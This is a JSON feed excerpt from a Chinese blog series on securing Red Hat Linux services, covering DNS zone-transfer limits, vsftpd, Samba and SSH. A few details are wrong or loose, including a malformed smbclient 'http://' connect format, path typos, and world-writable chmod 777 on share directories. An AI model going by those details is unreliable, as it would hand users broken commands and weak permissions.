从一定程度上能减轻信息泄漏。</p>\n<p>修改主配置文件</p>\n<div><pre><code>allow-transfer<span>{</span> <span>192.168</span>.199.0/24<span>;</span><span>}</span><span>;</span>   <span># 限制网段查询</span>\nallow-transfer <span>{</span> <span>192.168</span>.199.2<span>;</span><span>}</span><span>;</span>     <span># 限制 IP 查询</span>\nallow-transfer <span>{</span> any<span>;</span><span>}</span><span>;</span>               <span># 所有的都可以查询</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-dns-5.png\" alt=\"DNS\"></p>\n",
      "image": "https://vxhly.github.io/assets/liunx-dns-1.png",
      "date_published": "2016-09-27T13:25:48.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 服务配置笔记（三）FTP 服务安全配置",
      "url": "https://vxhly.github.io/views/liunx/liunx-service-ftp.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-service-ftp.html",
      "summary": "前言\n本篇是 Liunx 的服务配置笔记系列第三篇, 这一篇将具体介绍 Red Hat Liunx 下 FTP 服务的安全配置。确切的说, 应该叫它 vsFTP, 就是文件的上传和下载服务, 主要的功能是在服务器与客户端之间进行文件的传输。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的服务配置笔记系列第三篇, 这一篇将具体介绍 Red Hat Liunx 下 FTP 服务的安全配置。确切的说, 应该叫它 vsFTP, 就是文件的上传和下载服务, 主要的功能是在服务器与客户端之间进行文件的传输。</p>\n</div>\n\n<h2 id=\"配置文件的位置\" tabindex=\"-1\"> 配置文件的位置</h2>\n<p>主配置文件: <strong>/etc/vsftpd/vsftpd.conf</strong></p>\n<h2 id=\"服务的启动与停止\" tabindex=\"-1\"> 服务的启动与停止</h2>\n<div><p>提示</p>\n<p>FTP 的服务名并不叫做 <code>vsftp</code> , 而是 <code>vsftpd</code> 。<br> 修改配置文件过后一定要重启 <code>vsftpd</code> 服务。</p>\n</div>\n<div><pre><code><span>service</span> vsftpd status        <span># 状态</span>\n<span>service</span> vsftpd start         <span># 启动</span>\n<span>service</span> vsftpd stop          <span># 暂停</span>\n<span>service</span> vsftpd restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h2 id=\"服务的安装\" tabindex=\"-1\"> 服务的安装</h2>\n<h3 id=\"创建挂载目录\" tabindex=\"-1\"> 创建挂载目录</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> -p /mnt/cdrom\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"挂载光盘\" tabindex=\"-1\"> 挂载光盘</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装\" tabindex=\"-1\"> 安装</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>cd</span> /mnt/cdrom/Server\n<span>rpm</span> -ivh vsftpd-2.0.5-16.e15i386.rpm\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/liunx-ftp-1.png\" alt=\"FTP 安全配置\"></p>\n<h2 id=\"安全配置\" tabindex=\"-1\"> 安全配置</h2>\n<h3 id=\"禁止匿名用户登录\" tabindex=\"-1\"> 禁止匿名用户登录</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>anonymous_enable</span><span>=</span>YES\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认的值是允许的, 这样匿名用户就可以不需要密码就可以登录 FTP 了, 这样很不安全, 把它修改成 NO 吧。</p>\n<p><img src=\"/assets/liunx-ftp-7.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"使用客户端进行验证\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。我们就直接使用 FTP 用户登录吧。</p>\n<p><code>Connection Format:</code></p>\n<div><pre><code><span>ftp</span> <span>[</span>host<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>若没有成功登录, 则会显示</p>\n<div><pre><code><span>530</span> Login incorrect.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 <code>bye</code> , 可以退出 FTP, 成功则会显示</p>\n<div><pre><code><span>221</span> Googbye\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ftp-8.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"使用户不能登录系统-但可以登录-ftp\" tabindex=\"-1\"> 使用户不能登录系统, 但可以登录 FTP</h3>\n<p>首先要创建一个普通的用户, 使他不能登录系统, 只需设置登录的 shell 就好了。</p>\n<p>创建一个新用户, 别忘了设置密码, <code>For Example:</code></p>\n<div><pre><code><span>useradd</span> -s /sbin/nologin <span>test</span>\n<span>passwd</span> <span>test</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-ftp-9.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"使用客户端进行验证-1\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。这时候, 我们就要使用之前创建的用户进行验证了。</p>\n<p>若登录成功, 则会显示</p>\n<div><pre><code><span>230</span> Login successful\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ftp-11.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"禁止用户写入或者上传文件\" tabindex=\"-1\"> 禁止用户写入或者上传文件</h3>\n<p><code>Default Configuration:</code> <br></p>\n<div><pre><code><span>write_enable</span><span>=</span>YES\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认是允许用户进行上传或者写入文件, 我们可以根据需求进行修改。</p>\n<p><img src=\"/assets/liunx-ftp-12.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"使用客户端进行验证-2\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。这时候, 我们仍然使用之前创建的用户进行验证。</p>\n<p>无法创建目录, 则会显示</p>\n<div><pre><code><span>550</span> Permission denied\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>尝试切换目录, 成功则会显示</p>\n<div><pre><code><span>250</span> Directory successfully changed.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ftp-12.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"配置空闲会话中断时间\" tabindex=\"-1\"> 配置空闲会话中断时间</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>#idle_session_timeout=600</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认的配置时间是十分钟, （默认的单位为秒）, 我们可以根据需求进行修改。</p>\n<p><img src=\"/assets/liunx-ftp-2.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"使用客户端进行验证-3\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。成功登录之后, 我们等待一段时间, 在进行操作。</p>\n<p>若超时, 则会显示</p>\n<div><pre><code><span>421</span> Timeout\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ftp-3.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"配置数据连接超时时间\" tabindex=\"-1\"> 配置数据连接超时时间</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>#data_connection_timeout=120</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认的配置是两分钟, （默认的单位为秒）, 我们可以根据需求进行修改。</p>\n<p><img src=\"/assets/liunx-ftp-4.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"使用客户端进行验证-4\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>此选项需要在传输数据的时候可用, 这里不再进行演示。</p>\n<h3 id=\"限制普通用户只能在家目录中\" tabindex=\"-1\"> 限制普通用户只能在家目录中</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>#chroot_list_enable=YES</span>\n<span>#chroot_list_file=/etc/vsftpd/chroot_list</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>默认是允许用户跳出自己的家目录的, 我们可以限制他只能在自己的家目录里。注意, 要将用户限制在家目录中, 还需要设置 'chroot_local_user=YES'。</p>\n<p><img src=\"/assets/liunx-ftp-5.png\" alt=\"FTP 安全配置\"></p>\n<p>别忘了将禁止的用户添加至 <code>/etc/vsftpd/chroot_list</code></p>\n<h4 id=\"使用客户端进行验证-5\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。这时候, 我们仍然使用之前创建的用户进行验证。</p>\n<p>不能切换目录, 则会显示</p>\n<div><pre><code><span>550</span> Failed to changed directory.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ftp-6.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"设置黑名单\" tabindex=\"-1\"> 设置黑名单</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>userlist_enable</span><span>=</span>YES\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认情况下就是开启的, 若无开启, 我们可以根据需求进行修改。</p>\n<p><img src=\"/assets/liunx-ftp-13.png\" alt=\"FTP 安全配置\"></p>\n<p>别忘了, 将禁止的用户填入 <code>/etc/vsftpd/ftpusers</code></p>\n<h4 id=\"使用客户端进行验证-6\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。这时候, 我们新建一个用户, 然后将其加入黑名单, 再进行验证。</p>\n<p>新建用户, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-ftp-14.png\" alt=\"FTP 安全配置\"></p>\n<p>添加至黑名单, <code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-ftp-15.png\" alt=\"FTP 安全配置\"></p>\n<p><img src=\"/assets/liunx-ftp-16.png\" alt=\"FTP 安全配置\"></p>\n<h2 id=\"配置虚拟用户登录\" tabindex=\"-1\"> 配置虚拟用户登录</h2>\n<h3 id=\"先安装-db4\" tabindex=\"-1\"> 先安装 db4</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>rpm</span> -ivh db4-utils-4.3.29-10.el5.i386.rpm\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ftp-17.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"生成虚拟用户口令库文件\" tabindex=\"-1\"> 生成虚拟用户口令库文件</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>vim</span> /etc/vsftpd/login.txt\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>需要注意的是, 该文件的格式如下, 单数行为用户名, 偶数行为口令。</p>\n<p><img src=\"/assets/liunx-ftp-18.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"生成口令库文件-并修改其权限\" tabindex=\"-1\"> 生成口令库文件, 并修改其权限</h3>\n<p><code>For Example:</code></p>\n<div><pre><code>db_load -T -t <span>hash</span> -f /etc/vsftpd/login.txt /etc/vsftpd/login.db\n<span>chmod</span> <span>600</span> /etc/vsftpd/login.db\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>注意要设置权限, 只有 root 用户拥有读写权限。</p>\n<p><img src=\"/assets/liunx-ftp-19.png\" alt=\"FTP 安全配置\"></p>\n<h3 id=\"修改虚拟用户的-pam-文件\" tabindex=\"-1\"> 修改虚拟用户的 PAM 文件</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>vim</span> /etc/pam.d/vsftpd\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>加入如下内容, 其他的全部注释掉</p>\n<div><pre><code>auth required pam_userdb.so <span>db</span><span>=</span>/etc/vsftpd/login\naccount required pam_userdb.so <span>db</span><span>=</span>/etc/vsftpd/login\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><img src=\"/assets/liunx-ftp-20.png\" alt=\"FTP 安全配置\"></p>\n<p>数据文件的地址, 记得要写对哦。</p>\n<h3 id=\"建立虚拟用户-并设置权限\" tabindex=\"-1\"> 建立虚拟用户, 并设置权限</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>useradd</span> -d /home/ftp -s /sbin/nologin virtual\n<span>chmod</span> <span>777</span> /home/ftp\n<span>passwd</span> virtual\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-ftp-21.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"修改主配置文件\" tabindex=\"-1\"> 修改主配置文件</h4>\n<p>添加如下内容, <code>For Example:</code></p>\n<div><pre><code><span>guest_enable</span><span>=</span>YES\n<span>guest_username</span><span>=</span>virtual\n<span>user_config_dir</span><span>=</span>/etc/vsftpd_user_conf\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-ftp-24.png\" alt=\"FTP 安全配置\"></p>\n<h4 id=\"创建配置文件存放目录\" tabindex=\"-1\"> 创建配置文件存放目录</h4>\n<p>此目录一定要与配置文件中的一致, <code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> -p /etc/vsftpd_user_conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"为虚拟用户创建配置文件\" tabindex=\"-1\"> 为虚拟用户创建配置文件</h4>\n<p>为虚拟口令库中的每个用户分别创建一个配置文件, 配置文件中的配置于匿名用户的配置相差无几。</p>\n<p>先创建配置文件, <code>For Example:</code></p>\n<div><pre><code><span>vim</span> /etc/vsftpd_user_conf/ftp_test\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>在配置文件中配置如下内容,</p>\n<div><pre><code><span>anon_world_readable_only</span><span>=</span>NO               <span># 是否允许浏览 FTP 目录和下载</span>\n<span>anon_upload_enable</span><span>=</span>YES                    <span># 是否允许上传</span>\n<span>write_enable</span><span>=</span>YES                          <span># 是否有写权限</span>\n<span>download_enable</span><span>=</span>YES                       <span># 是否允许下载文件</span>\n<span>anon_mkdir_write_enable</span><span>=</span>YES               <span># 是否允许建立和删除目录</span>\n<span>anon_other_write_enable</span><span>=</span>YES               <span># 是否允许改名和删除文件</span>\n<span>local_root</span><span>=</span>/var/ftp/share/123\n<span># 指定虚拟用户在系统用户下面的路径,限制虚拟用户的家目录,虚拟用户登录后的主目录。</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-ftp-25.png\" alt=\"FTP 安全配置\"></p>\n<p>最后只需创建一下虚拟用户登录后的主目录, <code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> -p /var/ftp/share/123\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"登录测试\" tabindex=\"-1\"> 登录测试</h3>\n<p>这时候就要使用虚拟用户口令库文件里的用户名和密码来登录 FTP 服务器</p>\n<p><img src=\"/assets/liunx-ftp-23.png\" alt=\"FTP 安全配置\"></p>\n",
      "image": "https://vxhly.github.io/assets/liunx-ftp-1.png",
      "date_published": "2016-09-16T20:56:49.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 服务配置笔记（五）SAMBA 服务安全配置",
      "url": "https://vxhly.github.io/views/liunx/liunx-service-samba.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-service-samba.html",
      "summary": "前言\n本篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 SAMBA 服务的安全配置。所谓 SAMBA 就是建立 Liunx 和 Windows 之间的共享, 使 Windows 能够访问 Liunx 下共享出来的文件。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的服务配置笔记系列第五篇, 这一篇将具体介绍 Red Hat Liunx 下 SAMBA 服务的安全配置。所谓 SAMBA 就是建立 Liunx 和 Windows 之间的共享, 使 Windows 能够访问 Liunx 下共享出来的文件。</p>\n</div>\n\n<h2 id=\"配置文件的位置\" tabindex=\"-1\"> 配置文件的位置</h2>\n<p>主配置文件: <strong>/etc/samba/smb.conf</strong></p>\n<h2 id=\"服务的启动与停止\" tabindex=\"-1\"> 服务的启动与停止</h2>\n<div><p>提示</p>\n<p>SAMBA 的服务名并不叫做 <code>samba</code> , 而是 <code>smb</code> 。<br> 修改配置文件过后一定要重启 <code>smb</code> 服务。</p>\n</div>\n<div><pre><code><span>service</span> smb status        <span># 状态</span>\n<span>service</span> smb start         <span># 启动</span>\n<span>service</span> smb stop          <span># 暂停</span>\n<span>service</span> smb restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h2 id=\"服务的安装\" tabindex=\"-1\"> 服务的安装</h2>\n<h3 id=\"创建挂载目录\" tabindex=\"-1\"> 创建挂载目录</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> -p /mnt/cdrom\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"挂在光盘\" tabindex=\"-1\"> 挂在光盘</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mount</span> /dev/cdrom /mnt/cdrom\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"安装\" tabindex=\"-1\"> 安装</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>cd</span> /mnt/cdrom/Server\n<span>rpm</span> -ivh perl-Convert-ASN1-0.20-1.1.noarch.rpm\n<span>rpm</span> -ivh samba-3.0.33-3.28.el5.i386.rpm\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p><img src=\"/assets/liunx-samba-1.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h2 id=\"安全配置\" tabindex=\"-1\"> 安全配置</h2>\n<h3 id=\"配置工作组和-netbios-名字\" tabindex=\"-1\"> 配置工作组和 NetBIOS 名字</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>workgroup <span>=</span> MYGROUP\n<span>;</span>netbios name <span>=</span> MYSERVER\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><div><p>提示</p>\n<p>该文件默认配置的工作组是 MYGROUP, 而 Windows 下的工作组默认为 WORKGROUP, Liunx 和 Windows 的工作组一定要一样, 才能访问共享的文件。<br> 该文件默认将 NetBIOS 的名字注释掉了, NetBIOS 名字就是会在 Windows 下的网上邻居能够看到的名字, 注释掉就是会看不到, 建议去掉注释。</p>\n</div>\n<p><img src=\"/assets/liunx-samba-2.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"配置安全级别\" tabindex=\"-1\"> 配置安全级别</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>security <span>=</span> user\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认的配置是 <code>user</code> 模式, 在该模式下, Windows 下访问 SAMBA 需要用户名和密码, 还可以设置的选项还有 <code>share/user/server/domain/ads</code> 。可以根据需求修改此选项。</p>\n<ul>\n<li><strong>share</strong>: 访问 Samba 服务器共享资源时不需要输入用户名和密码, 属于匿名访问。</li>\n<li><strong>user</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为 Samba 服务器本机。</li>\n<li><strong>server</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为另一台 Samba 服务器或 Windows 服务器。</li>\n<li><strong>domain</strong>: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 域。</li>\n<li><strong>ads</strong>: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 活动目录。</li>\n</ul>\n<h3 id=\"配置认证密码在传输过程中加密\" tabindex=\"-1\"> 配置认证密码在传输过程中加密</h3>\n<p>在默认的配置文件中没有此选项, 可以手动添加, 正常情况下是需要开启的。</p>\n<p><code>For Example:</code></p>\n<div><pre><code>encrypt passwords <span>=</span> <span>yes</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-samba-3.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"配置用户密码的存储方式\" tabindex=\"-1\"> 配置用户密码的存储方式</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code>passdb backend <span>=</span> tdbsam\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>默认的配置为 <code>tdbsam</code> , 配置这个选项就是需要 <code>smbpasswd -a [userName]</code> 来建立 Samba 用户。还可以配置项为 <code>tdbsam/smbpasswd/ldapsam/mysql</code> 。可以根据需求进行修改。</p>\n</div>\n<ul>\n<li><strong>tdbsam</strong>: 该方式使用一个数据库文件来建立用户数据库, 数据库文件名为 passdb.tdb 。可以使用 smbpasswd -a [用户名] 来建立 Samba 用户。也可以使用 pdbedit 命令来建立用户。</li>\n<li><strong>smbpasswd</strong>: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码, 客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 smb passwd file = /usr/local/samba/etc/smbpasswd（或 /etc/samba/smbpasswd） 参数来指定保存用户名和密码的文件, 该文件需要手动建立。不推荐使用此方法。</li>\n<li><strong>ldapsam</strong>: 该方式基于 LADP 的账户管理方式来验证用户, 先要建立 LDAP 服务。</li>\n<li><strong>mysql</strong>: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。</li>\n</ul>\n<p><img src=\"/assets/liunx-samba-4.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"设置白名单\" tabindex=\"-1\"> 设置白名单</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span>;</span>hosts allow <span>=</span> <span>127</span><span>\\</span>. <span>192.168</span>.12<span>\\</span>. <span>192.168</span>.13.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>默认的配置是将白名单进行注释掉的, 这里需要注意的是, 可以配置一个具体的 IP 地址, 也可以配置一个 IP 地址段, 在配置 IP 地址段的时候要注意最后一个 <code>.</code> 不要忘了写。如默认配置中的 <code>127.</code> 就是规定 <code>127.0.0.1 ～ 127.255.255.254</code> 这个 IP 地址段可以进行访问, 具体的 IP 地址不需要最后的 <code>.</code> .</p>\n</div>\n<p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-samba-5.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"单目录限定用户访问-禁止写入文件\" tabindex=\"-1\"> 单目录限定用户访问, 禁止写入文件</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>[</span>test<span>]</span>                    <span># 共享目录的名字</span>\n  comment <span>=</span> <span>test</span>          <span># 描述信息</span>\n  path <span>=</span> /home/test       <span># 共享目录路径</span>\n  browseable <span>=</span> <span>yes</span>        <span># 是否允许浏览</span>\n  writable <span>=</span> no           <span># 是否允许用户写入或者创建文件</span>\n  guest ok <span>=</span> no           <span># 是否允许 guest 用户访问</span>\n  valid <span>users</span> <span>=</span> sx\n  <span># 白名单,指定能够进入此资源目录的特定用户,使用逗号隔开,如果是组的话,使用 @ 指明</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>另外还可以配置以下参数</p>\n<ul>\n<li><strong>read only</strong> =&gt; 设置是否只读, <code>yes/no</code></li>\n<li><strong>public</strong> =&gt; 设置是否让所有可以登录的用户看到这个项目</li>\n<li><strong>create mode</strong> =&gt; 指明新建立的文件的属性, 一般是 <code>0755</code> 。</li>\n<li><strong>directory mode</strong> =&gt; 指明新建立的目录的属性, 一般是 <code>0755</code> 。</li>\n</ul>\n<p><img src=\"/assets/liunx-samba-6.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"创建共享目录-设置权限\" tabindex=\"-1\"> 创建共享目录, 设置权限</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>mkdir</span> /hoem/test\n<span>chmod</span> <span>777</span> /home/test\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><div><p>注意</p>\n<p>共享目录一定要有执行权限, 一般 <code>755</code> 就够了, 这里设置 <code>777</code> 就是权限大一点就是了。</p>\n</div>\n<p><img src=\"/assets/liunx-samba-7.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"添加-samba-用户\" tabindex=\"-1\"> 添加 SAMBA 用户</h3>\n<p><code>For Example:</code></p>\n<div><pre><code><span>useradd</span> zc\n<span>useradd</span> sx\nsmbpasswd -a zc\nsmbpasswd -a sx\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>这里需要注意的是, 要使用 <code>smbpasswd -a</code> 创建用户, 因为之前设置了用户密码的存储方式为 <code>tdbsam</code> 。</p>\n</div>\n<p><img src=\"/assets/liunx-samba-8.png\" alt=\"SAMBA 服务安全配置\"></p>\n<h3 id=\"使用-windows-访问\" tabindex=\"-1\"> 使用 windows 访问</h3>\n<p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/liunx-samba-9.png\" alt=\"SAMBA 服务安全配置\"></p>\n<p>输入用户名和密码, 就可以愉快的进行测试了, 这里就不多说了。</p>\n<h3 id=\"使用-smbclient-访问\" tabindex=\"-1\"> 使用 smbclient 访问</h3>\n<h4 id=\"列出共享文件夹\" tabindex=\"-1\"> 列出共享文件夹</h4>\n<p>列出某个 IP 地址所提供的共享文件夹</p>\n<p><code>Connect Format:</code></p>\n<div><pre><code>smbclient -L <span>[</span>ip<span>]</span> -U <span>[</span>userName<span>]</span>%<span>[</span>password<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"像-ftp-客户端一样使用-smbclient\" tabindex=\"-1\"> 像 FTP 客户端一样使用 smbclient</h4>\n<div><p>提示</p>\n<p>执行 smbclient 命令成功后, 进入 smbclient 环境, 出现提示符: <code>smb:\\&gt;</code> 这里有许多命令和 ftp 命令相似, 如 <code>cd</code> 、 <code>lcd</code> 、 <code>get</code> 、 <code>megt</code> 、 <code>put</code> 、 <code>mput</code> 等。通过这些命令, 我们可以访问远程主机的共享资源。</p>\n</div>\n<p><code>Connect Format:</code></p>\n<div><pre><code>smbclient http://<span>[</span>ip<span>]</span>/<span>[</span>shareFolder<span>]</span> -U <span>[</span>username<span>]</span>%<span>[</span>password<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/liunx-samba-1.png",
      "date_published": "2016-09-19T19:33:21.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 服务配置笔记（二）SSH 服务安全配置",
      "url": "https://vxhly.github.io/views/liunx/liunx-service-ssh.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-service-ssh.html",
      "summary": "前言\n本篇是 Liunx 的服务配置笔记系列第二篇, 这一篇将具体介绍 Red Hat Liunx 下 SSH 服务的安全配置。所谓 SSH 就是加密的数据传输, 但是使用其的默认配置并不是安全的, 所以还需要对其进行详细的配置。\n\n",
      "content_html": "<div><p>前言</p>\n<p>本篇是 Liunx 的服务配置笔记系列第二篇, 这一篇将具体介绍 Red Hat Liunx 下 SSH 服务的安全配置。所谓 SSH 就是加密的数据传输, 但是使用其的默认配置并不是安全的, 所以还需要对其进行详细的配置。</p>\n</div>\n\n<h2 id=\"配置文件的位置\" tabindex=\"-1\"> 配置文件的位置</h2>\n<p>主配置文件: <strong>/etc/ssh/sshd_config</strong></p>\n<h2 id=\"服务的启动与停止\" tabindex=\"-1\"> 服务的启动与停止</h2>\n<div><p>提示</p>\n<p>SSH 的服务名并不叫做 <code>ssh</code> , 而是 <code>sshd</code> 。<br> 修改配置文件过后一定要重启 <code>sshd</code> 服务。</p>\n</div>\n<div><pre><code><span>service</span> sshd status        <span># 状态</span>\n<span>service</span> sshd start         <span># 启动</span>\n<span>service</span> sshd stop          <span># 暂停</span>\n<span>service</span> sshd restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h2 id=\"安全配置\" tabindex=\"-1\"> 安全配置</h2>\n<h3 id=\"修改端口号\" tabindex=\"-1\"> 修改端口号</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span># Port 22</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><div><p>提示</p>\n<p>配置文件中将其注释掉, 则采用默认的端口 22, 我们可以修改它。去掉 # , 修改成我们想要的端口号。</p>\n</div>\n<p><code>Example Configuration:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-1.png\" alt=\"SSH 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<div><p>提示</p>\n<p>验证之前, 请重启服务。默认是允许 root 用户登录的, 以下测试例子是使用 root 用户登录的。</p>\n</div>\n<p>使用默认端口连接, <code>Connection Format:</code></p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>host <span>|</span> ip<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>若端口不对则会显示</p>\n<div><pre><code>ssh: connect to <span>host</span> <span>[</span>host <span>|</span> ip<span>]</span> <span>[</span>port<span>]</span> <span>22</span>: Connection refused\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>Example Connection:</code> <br></p>\n<p><img 